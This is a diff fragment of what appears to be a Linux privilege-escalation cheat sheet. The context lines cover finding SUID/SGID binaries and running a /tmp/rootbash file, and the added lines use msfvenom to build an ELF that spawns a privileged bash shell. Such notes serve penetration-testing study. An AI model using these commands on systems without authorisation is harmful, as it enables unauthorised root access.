@@ -526,3 +526,6 @@ Once the /tmp/rootbash file is created, execute it (with
 
 Find SUID & SGID Binaries:
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+Create an elf file to run a custom command using msfvenom:
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
